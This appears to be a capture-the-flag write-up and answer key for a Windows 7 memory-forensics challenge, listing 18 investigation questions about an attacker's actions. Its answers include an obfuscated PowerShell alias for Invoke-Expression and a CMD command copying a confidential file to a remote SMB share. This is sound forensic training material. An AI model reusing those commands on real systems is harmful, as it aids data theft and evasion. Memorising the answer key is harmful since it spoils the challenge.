# Recollection

## Speech
```
A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.
```

## Analysis

## Questions
1. What is the Operating System of the machine?
    > Windows 7
2. When was the memory dump created?
    > 2022-12-19 16:07:30
3. After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?
    > (gv '*MDR*').naMe[3,11,2]-joIN''
4. The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?
    > Invoke-Expression
5. A CMD command was executed to attempt to exfiltrate a file. What is the full command line?
    > type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
6. Following the above command, now tell us if the file was exfiltrated successfully?
    > No
7. The attacker tried to create a readme file. What was the full path of the file?
    > C:\Users\Public\Office\readme.txt
8. What was the Host Name of the machine?
    > USER-PC
9. How many user accounts were in the machine?
    > 3
10. In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?
    > \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
11. A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?
    > b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
12. Following the previous question, what is the Imphash of the malicous file you found above?
    > d3b592cd9481e4f053b5362e22d61595
13. Following the previous question, tell us the date in UTC format when the malicious file was created?
    > 2022-06-22 11:49:04
14. What was the local IP address of the machine?
    > 192.168.0.104
15. There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?
    > cmd.exe
16. Attacker might have used an email address to login a social media. Can you tell us the email address?
    > mafia_code1337@gmail.com
17. Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?
    > Wazuh
18. The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?
    > csrsss.exe